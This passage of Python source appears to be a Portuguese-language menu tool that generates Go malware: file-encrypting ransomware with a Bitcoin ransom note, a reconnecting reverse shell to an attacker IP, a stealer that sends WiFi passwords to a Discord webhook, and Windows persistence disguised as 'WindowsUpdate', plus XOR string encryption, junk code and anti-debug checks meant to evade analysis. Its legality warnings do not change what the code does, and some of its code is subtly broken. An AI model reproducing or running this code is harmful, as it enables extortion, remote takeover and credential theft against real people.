            table.add_row("0", "Técnicas", "", "Opções de ofuscação")
            table.add_row("9", "Sair", "", "Encerrar o programa")

            console.print(table)

            choice = Prompt.ask(
                "[blink yellow]➤[/blink yellow] Selecione",
                choices=[str(i) for i in range(0, len(self.payloads)+1)] + ['9'],
                show_choices=False
            )

            if choice == "1":
                self._process_payload('ransomware')
            elif choice == "2":
                self._process_payload('reverse_shell')
            elif choice == "3":
                self._process_payload('credential_stealer')
            elif choice == "4":
                self._process_payload('persistence')
            elif choice == "0":
                self._show_techniques_menu()
            elif choice == "9":
                self._exit()

    def _show_techniques_menu(self):
        while True:
            console.clear()
            console.print(Panel.fit(
                "[bold cyan]⚙️ TÉCNICAS DE OFUSCAÇÃO (GOLANG)[/bold cyan]",
                border_style="cyan"
            ))

            table = Table(show_header=True, header_style="bold blue")
            table.add_column("ID", style="cyan", width=5)
            table.add_column("Técnica", style="green")
            table.add_column("Descrição")

            for i, (code, desc) in enumerate(self.obfuscation_techniques.items(), 1):
                table.add_row(str(i), desc, self._technique_description(code))

            console.print(table)

            choice = Prompt.ask(
                "[blink yellow]➤[/blink yellow] Selecione (0 para voltar)",
                choices=[str(i) for i in range(0, len(self.obfuscation_techniques)+1)],
                show_choices=False
            )

            if choice == "0":
                return

    def _technique_description(self, code: str) -> str:
        descriptions = {
            'polymorphic': "Altera a estrutura do código a cada compilação",
            'encrypt': "Criptografa seções críticas do código",
            'junk': "Adiciona código inútil para dificultar análise",
            'antidebug': "Inclui verificações anti-debugging",
            'obfuscate': "Ofusca strings e nomes de variáveis"
        }
        return descriptions.get(code, "Sem descrição disponível")

    def _process_payload(self, payload_name: str):
        payload_data = self.payloads[payload_name]

        if payload_data['danger_level'] in ['high', 'critical']:
            console.print(Panel.fit(
                "[blink bold red]⚠️ PERIGO ELEVADO ⚠️[/blink bold red]\n"
                "Este payload pode causar danos permanentes ou violar leis.\n"
                "Use apenas em ambientes controlados e com autorização!",
                border_style="red"
            ))

            if not Confirm.ask("Confirmar criação?", default=False):
                return

        config = self._configure_payload(payload_name)
        if config is None:
            return

        obfuscate = Confirm.ask("Aplicar técnicas de ofuscação?")
        techniques = []
        if obfuscate:
            techniques = self._select_obfuscation_techniques()

        with Progress() as progress:
            task = progress.add_task("[red]Gerando código Go...[/red]", total=100)

            payload = payload_data['function'](**config)
            progress.update(task, advance=40)

            if obfuscate:
                for technique in techniques:
                    payload = self._obfuscate_go_code(payload, technique)
                    progress.update(task, advance=15)

            progress.update(task, completed=100)

        self._preview_payload(payload)
        self._save_payload(payload_name, payload)

    def _configure_payload(self, payload_name: str) -> Optional[Dict]:
        config = {}

        if payload_name == 'ransomware':
            console.print(Panel.fit(
                "[bold red]Configuração do Ransomware[/bold red]",
                border_style="red"
            ))
            config['extensions'] = Prompt.ask(
                "[yellow]?[/yellow] Extensões a criptografar (separadas por vírgula)",
                default=".doc,.docx,.xls,.xlsx,.pdf,.jpg,.png,.txt,.sql"
            ).split(',')
            config['ransom_note'] = Prompt.ask(
                "[yellow]?[/yellow] Mensagem de resgate",
                default="Seus arquivos foram criptografados! Pague 0.5 BTC para descriptografar."
            )
            config['wallet'] = Prompt.ask(
                "[yellow]?[/yellow] Endereço da carteira Bitcoin",
                default="1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
            )
            config['contact'] = Prompt.ask(
                "[yellow]?[/yellow] Método de contato",
                default="email@protonmail.com"
            )

        elif payload_name == 'reverse_shell':
            console.print(Panel.fit(
                "[bold]Configuração Reverse Shell[/bold]",
                border_style="blue"
            ))
            config['ip'] = Prompt.ask(
                "[yellow]?[/yellow] IP do atacante",
                default="192.168.1.100"
            )
            config['port'] = IntPrompt.ask(
                "[yellow]?[/yellow] Porta",
                default=4444
            )
            config['reconnect'] = Confirm.ask(
                "[yellow]?[/yellow] Tentar reconexão automática?",
                default=True
            )

        elif payload_name == 'credential_stealer':
            console.print(Panel.fit(
                "[bold]Configuração Credential Stealer[/bold]",
                border_style="blue"
            ))
            config['webhook'] = Prompt.ask(
                "[yellow]?[/yellow] Webhook para envio dos dados",
                default="https://discord.com/api/webhooks/..."
            )
            config['browsers'] = Confirm.ask(
                "[yellow]?[/yellow] Roubar credenciais de navegadores?",
                default=True
            )
            config['wifi'] = Confirm.ask(
                "[yellow]?[/yellow] Roubar senhas WiFi?",
                default=True
            )

        elif payload_name == 'persistence':
            console.print(Panel.fit(
                "[bold]Configuração Persistência[/bold]",
                border_style="blue"
            ))
            config['method'] = Prompt.ask(
                "[yellow]?[/yellow] Método (registry/scheduled/startup)",
                choices=["registry", "scheduled", "startup"],
                default="registry"
            )
            config['payload_path'] = Prompt.ask(
                "[yellow]?[/yellow] Caminho do payload para persistência",
                default="C:\\Users\\Public\\payload.exe"
            )

        console.print("\n[bold]Resumo:[/bold]")
        for key, value in config.items():
            console.print(f"  [cyan]{key}:[/cyan] {value}")

        if not Confirm.ask("Confirmar configurações?"):
            return None

        return config

    def _select_obfuscation_techniques(self) -> List[str]:
        console.print("\n[bold]Técnicas de Ofuscação:[/bold]")
        table = Table(show_header=True, header_style="bold magenta")
        table.add_column("ID", style="cyan", width=5)
        table.add_column("Técnica", style="green")

        for i, (code, desc) in enumerate(self.obfuscation_techniques.items(), 1):
            table.add_row(str(i), desc)

        console.print(table)

        choices = Prompt.ask(
            "[yellow]?[/yellow] Selecione as técnicas (separadas por vírgula)",
            default="1,3,5"
        )

        return [list(self.obfuscation_techniques.keys())[int(x)-1] for x in choices.split(',')]

    def _preview_payload(self, payload: str):
        console.print(Panel.fit(
            "[bold]PRÉ-VISUALIZAÇÃO DO CÓDIGO GO[/bold]",
            border_style="yellow"
        ))

        lines = payload.split('\n')[:30]
        code = '\n'.join(lines)

        console.print(Syntax(code, "go", theme="monokai", line_numbers=True))

        if len(payload.split('\n')) > 30:
            console.print("[yellow]... (truncado, mostrando apenas as primeiras 30 linhas)[/yellow]")

    def _save_payload(self, payload_name: str, payload: str):
        filename = Prompt.ask(
            "[yellow]?[/yellow] Nome do arquivo Go",
            default=f"payload_{payload_name}.go"
        )

        try:
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(payload)

            with open(filename, 'rb') as f:
                md5 = hashlib.md5(f.read()).hexdigest()
                sha256 = hashlib.sha256(f.read()).hexdigest()

            compile_cmd = f"go build -ldflags=\"-s -w\" -o {filename[:-3]}.exe {filename}"

            console.print(Panel.fit(
                f"[green]✓ Arquivo salvo como [bold]{filename}[/bold][/green]\n"
                f"[cyan]MD5: [bold]{md5}[/bold][/cyan]\n"
                f"[cyan]SHA256: [bold]{sha256}[/bold][/cyan]\n\n"
                f"[yellow]Para compilar (Windows):[/yellow]\n"
                f"[white]{compile_cmd}[/white]\n\n"
                f"[yellow]Para compilar sem console (Windows):[/yellow]\n"
                f"[white]go build -ldflags=\"-s -w -H=windowsgui\" -o {filename[:-3]}.exe {filename}[/white]",
                title="[bold green]SUCESSO[/bold green]",
                border_style="green"
            ))

        except Exception as e:
            console.print(Panel.fit(
                f"[red]✗ Erro: {str(e)}[/red]",
                title="[bold red]ERRO[/bold red]",
                border_style="red"
            ))

        input("\nPressione Enter para continuar...")

    def _obfuscate_go_code(self, payload: str, technique: str) -> str:
        if technique == 'polymorphic':
            return self._apply_polymorphic(payload)
        elif technique == 'encrypt':
            return self._apply_encryption(payload)
        elif technique == 'junk':
            return self._add_junk_code(payload)
        elif technique == 'antidebug':
            return self._add_antidebug(payload)
        elif technique == 'obfuscate':
            return self._obfuscate_strings(payload)
        return payload

    def _apply_polymorphic(self, payload: str) -> str:
        # Substitui declarações de variáveis por equivalentes
        replacements = {
            "var ": "var /*"+''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))+"*/ ",
            " = ": " /*"+''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=4))+"*/= ",
            " := ": " /*"+''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=4))+"*/:= "
        }
        
        for old, new in replacements.items():
            payload = payload.replace(old, new)
        
        return payload

    def _apply_encryption(self, payload: str) -> str:
        # Encontra strings importantes para criptografar
        import re
        strings = re.findall('"[^"]*"', payload)
        
        for s in set(strings):
            if len(s) > 10:  # Só criptografa strings maiores
                key = random.randint(1, 255)
                encrypted = [str(ord(c) ^ key) for c in s[1:-1]]
                decryption_code = f"""func decrypt_{''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))}() string {{
    data := []byte{{{','.join(encrypted)}}}
    key := byte({key})
    decrypted := make([]byte, len(data))
    for i := range data {{
        decrypted[i] = data[i] ^ key
    }}
    return string(decrypted)
}}"""
                payload = payload.replace(s, f'decrypt_{''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))}()')
                payload = decryption_code + "\n\n" + payload
        
        return payload

    def _add_junk_code(self, payload: str) -> str:
        junk_funcs = [
            "func {0}() {{\n    if false {{\n        fmt.Println(\"{1}\")\n    }}\n    time.Sleep(1 * time.Millisecond)\n}}".format(
                ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8)),
                ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=20))
            for _ in range(3)
        ]
        
        main_index = payload.find("func main()")
        if main_index != -1:
            payload = payload[:main_index] + "\n".join(junk_funcs) + "\n\n" + payload[main_index:]
        
        return payload

    def _add_antidebug(self, payload: str) -> str:
        anti_debug_code = """
import (
    "syscall"
    "unsafe"
)

const (
    PROCESS_QUERY_INFORMATION = 0x0400
    PROCESS_VM_READ           = 0x0010
)

var (
    modkernel32 = syscall.NewLazyDLL("kernel32.dll")
    procIsDebuggerPresent = modkernel32.NewProc("IsDebuggerPresent")
)

func isDebuggerPresent() bool {
    flag, _, _ := procIsDebuggerPresent.Call()
    return flag != 0
}

func checkDebugging() {
    if isDebuggerPresent() {
        os.Exit(1)
    }
    
    // Outras verificações podem ser adicionadas aqui
}
"""
        
        main_index = payload.find("func main()")
        if main_index != -1:
            payload = payload[:main_index] + anti_debug_code + "\n\n" + payload[main_index:]
            payload = payload.replace("func main()", "func main() {\n    checkDebugging()")
        
        return payload

    def _obfuscate_strings(self, payload: str) -> str:
        # Ofusca strings importantes
        import re
        strings = re.findall('"[^"]*"', payload)
        
        for s in set(strings):
            if len(s) > 5:  # Só ofusca strings maiores
                parts = [f'"{s[i:i+2]}"' for i in range(1, len(s)-1, 2)]
                new_str = '" + "'.join(parts)
                if len(s) % 2 != 0:
                    new_str += f' + "{s[-2]}"'
                payload = payload.replace(s, new_str)
        
        return payload

    # Implementações dos payloads em Go
    def generate_ransomware(self, extensions: List[str], ransom_note: str, wallet: str, contact: str, **kwargs) -> str:
        ext_str = ', '.join(f'"{ext}"' for ext in extensions)
        return f"""package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"encoding/hex"
	"errors"
	"fmt"
	"io"
	"io/ioutil"
	"os"
	"path/filepath"
	"strings"
)

var (
	targetExtensions = []string{{{ext_str}}}
	ransomMessage = `{ransom_note}

Bitcoin Wallet: {wallet}
Contact: {contact}`
)

func main() {{
	// Gera chave AES
	key := make([]byte, 32)
	if _, err := rand.Read(key); err != nil {{
		fmt.Println("Error generating key:", err)
		return
	}}

	// Criptografa arquivos
	if err := encryptFiles(key); err != nil {{
		fmt.Println("Error encrypting files:", err)
		return
	}}

	// Gera chave RSA para criptografar a chave AES
	privKey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {{
		fmt.Println("Error generating RSA key:", err)
		return
	}}

	// Criptografa a chave AES com RSA
	encryptedKey, err := rsa.EncryptOAEP(
		sha256.New(),
		rand.Reader,
		&privKey.PublicKey,
		key,
		nil,
	)
	if err != nil {{
		fmt.Println("Error encrypting AES key:", err)
		return
	}}

	// Salva a chave criptografada e a mensagem de resgate
	if err := ioutil.WriteFile("DECRYPT_INSTRUCTIONS.txt", []byte(ransomMessage), 0644); err != nil {{
		fmt.Println("Error saving instructions:", err)
	}}
	if err := ioutil.WriteFile("ENCRYPTED_KEY.bin", encryptedKey, 0644); err != nil {{
		fmt.Println("Error saving encrypted key:", err)
	}}
}}

func encryptFiles(key []byte) error {{
	return filepath.Walk("C:\\\\", func(path string, info os.FileInfo, err error) error {{
		if err != nil {{
			return nil
		}}

		if info.IsDir() {{
			return nil
		}}

		// Verifica extensão
		ext := filepath.Ext(path)
		shouldEncrypt := false
		for _, targetExt := range targetExtensions {{
			if strings.EqualFold(ext, targetExt) {{
				shouldEncrypt = true
				break
			}}
		}}

		if shouldEncrypt {{
			if err := encryptFile(path, key); err != nil {{
				fmt.Printf("Error encrypting %s: %v\\n", path, err)
			}} else {{
				fmt.Println("Encrypted:", path)
			}}
		}}

		return nil
	}})
}}

func encryptFile(filename string, key []byte) error {{
	// Lê o arquivo original
	plaintext, err := ioutil.ReadFile(filename)
	if err != nil {{
		return err
	}}

	// Cria o cipher block
	block, err := aes.NewCipher(key)
	if err != nil {{
		return err
	}}

	// Gera IV
	ciphertext := make([]byte, aes.BlockSize+len(plaintext))
	iv := ciphertext[:aes.BlockSize]
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {{
		return err
	}}

	// Criptografa
	stream := cipher.NewCFBEncrypter(block, iv)
	stream.XORKeyStream(ciphertext[aes.BlockSize:], plaintext)

	// Sobrescreve o arquivo original
	if err := ioutil.WriteFile(filename, ciphertext, 0644); err != nil {{
		return err
	}}

	// Renomeia para .encrypted
	return os.Rename(filename, filename+".encrypted")
}}
"""

    def generate_reverse_shell(self, ip: str, port: int, reconnect: bool, **kwargs) -> str:
        reconnect_code = """
    // Tenta reconectar indefinidamente
    for {
        if err := connectAndExecute(); err != nil {
            time.Sleep(5 * time.Second) // Espera antes de tentar novamente
        }
    }""" if reconnect else "connectAndExecute()"

        return f"""package main

import (
	"net"
	"os"
	"os/exec"
	"runtime"
	"time"
)

func main() {{
    {reconnect_code}
}}

func connectAndExecute() error {{
	// Conecta ao servidor
	conn, err := net.Dial("tcp", "{ip}:{port}")
	if err != nil {{
		return err
	}}
	defer conn.Close()

	// Redireciona stdin/stdout/stderr para a conexão
	cmd := exec.Command("cmd.exe")
	if runtime.GOOS == "windows" {{
		cmd = exec.Command("cmd.exe")
	}} else {{
		cmd = exec.Command("/bin/sh", "-i")
	}}

	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn

	// Executa o shell
	return cmd.Run()
}}
"""

    def generate_credential_stealer(self, webhook: str, browsers: bool, wifi: bool, **kwargs) -> str:
        browser_code = """
    // Rouba credenciais de navegadores
    if err := stealBrowserCredentials(webhook); err != nil {
        fmt.Println("Error stealing browser credentials:", err)
    }""" if browsers else ""

        wifi_code = """
    // Rouba senhas WiFi
    if err := stealWifiPasswords(webhook); err != nil {
        fmt.Println("Error stealing WiFi passwords:", err)
    }""" if wifi else ""

        return f"""package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"os/exec"
	"strings"
)

func main() {{
	webhook := "{webhook}"
    {browser_code}
    {wifi_code}
}}

func stealBrowserCredentials(webhook string) error {{
	// Implementação para Chrome
	chromeData, err := getChromeCredentials()
	if err != nil {{
		return err
	}}

	// Implementação para Firefox
	firefoxData, err := getFirefoxCredentials()
	if err != nil {{
		return err
	}}

	data := map[string]interface{}{{
		"chrome": chromeData,
		"firefox": firefoxData,
	}}

	return sendToWebhook(webhook, data)
}}

func getChromeCredentials() ([]map[string]string, error) {{
	// Implementação real precisaria acessar o banco de dados do Chrome
	// Esta é apenas uma demonstração
	return []map[string]string{{
		{{"url": "https://example.com", "username": "user1", "password": "pass123"}},
	}}, nil
}}

func getFirefoxCredentials() ([]map[string]string, error) {{
	// Implementação real precisaria acessar o banco de dados do Firefox
	return []map[string]string{{
		{{"url": "https://example.com", "username": "user2", "password": "pass456"}},
	}}, nil
}}

func stealWifiPasswords(webhook string) error {{
	// Executa comandos para obter perfis WiFi
	cmd := exec.Command("netsh", "wlan", "show", "profiles")
	output, err := cmd.CombinedOutput()
	if err != nil {{
		return err
	}}

	// Processa os resultados
	profiles := []string{{}}
	lines := strings.Split(string(output), "\\n")
	for _, line := range lines {{
		if strings.Contains(line, "Todos os Perfis de Usuário") {{
			parts := strings.Split(line, ":")
			if len(parts) > 1 {{
				profiles = append(profiles, strings.TrimSpace(parts[1]))
			}}
		}}
	}}

	// Obtém senhas para cada perfil
	results := []map[string]string{{}}
	for _, profile := range profiles {{
		if profile == "" {{
			continue
		}}

		cmd := exec.Command("netsh", "wlan", "show", "profile", profile, "key=clear")
		output, err := cmd.CombinedOutput()
		if err != nil {{
			continue
		}}

		password := ""
		lines := strings.Split(string(output), "\\n")
		for _, line := range lines {{
			if strings.Contains(line, "Conteúdo da Chave") {{
				parts := strings.Split(line, ":")
				if len(parts) > 1 {{
					password = strings.TrimSpace(parts[1])
				}}
			}}
		}}

		results = append(results, map[string]string{{
			"ssid": profile,
			"password": password,
		}})
	}}

	return sendToWebhook(webhook, map[string]interface{}{{"wifi": results}})
}}

func sendToWebhook(webhook string, data interface{}) error {{
	jsonData, err := json.Marshal(data)
	if err != nil {{
		return err
	}}

	resp, err := http.Post(webhook, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {{
		return err
	}}
	defer resp.Body.Close()

	return nil
}}
"""

    def generate_persistence(self, method: str, payload_path: str, **kwargs) -> str:
        registry_code = """
	// Persistência via Registry Run Key
	key, _, err := reg.CreateKey(registry.CURRENT_USER, `Software\\Microsoft\\Windows\\CurrentVersion\\Run`, registry.ALL_ACCESS)
	if err != nil {
		return err
	}
	defer key.Close()

	return key.SetStringValue("WindowsUpdate", payloadPath)"""

        scheduled_task_code = """
	// Persistência via Agendador de Tarefas
	cmd := exec.Command("schtasks", "/create", "/tn", "WindowsUpdate", "/tr", payloadPath, "/sc", "onlogon", "/rl", "highest", "/f")
	return cmd.Run()"""

        startup_code = """
	// Persistência via Pasta Startup
	startupPath := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "WindowsUpdate.lnk")
	
	// Cria um atalho
	cmd := exec.Command("cmd", "/c", fmt.Sprintf(`powershell -command "$s=(New-Object -COM WScript.Shell).CreateShortcut('%s');$s.TargetPath='%s';$s.Save()"`, startupPath, payloadPath))
	return cmd.Run()"""

        persistence_code = {
            "registry": registry_code,
            "scheduled": scheduled_task_code,
            "startup": startup_code
        }.get(method, registry_code)

        return f"""package main

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
	"golang.org/x/sys/windows/registry"
)

func main() {{
	// Obtém o caminho absoluto do payload
	payloadPath := "{payload_path}"
	if !filepath.IsAbs(payloadPath) {{
		exe, err := os.Executable()
		if err != nil {{
			fmt.Println("Error getting executable path:", err)
			return
		}}
		payloadPath = filepath.Join(filepath.Dir(exe), payloadPath)
	}}

	// Configura persistência
	if err := setupPersistence(payloadPath); err != nil {{
		fmt.Println("Error setting up persistence:", err)
		return
	}}

	fmt.Println("Persistence configured successfully")
}}

func setupPersistence(payloadPath string) error {{
    {persistence_code}
}}
"""

    def _exit(self):
        console.print(Panel.fit(
            "[blink bold red]⚠️ ATENÇÃO: DESENVOLVER MALWARE É CRIME EM MUITOS PAÍSES! ⚠️[/blink bold red]",
            border_style="red"
        ))
        console.print("[cyan]Saindo...[/cyan]")
        time.sleep(1)
        sys.exit(0)

def main():
    try:
        generator = GoMalwareGenerator()
        generator.show_main_menu()
    except KeyboardInterrupt:
        console.print("\n[red]✗ Cancelado pelo usuário[/red]")
        sys.exit(0)
    except Exception as e:
        console.print(f"\n[red]✗ Erro fatal: {str(e)}[/red]")
        sys.exit(1)

if __name__ == '__main__':
    main()
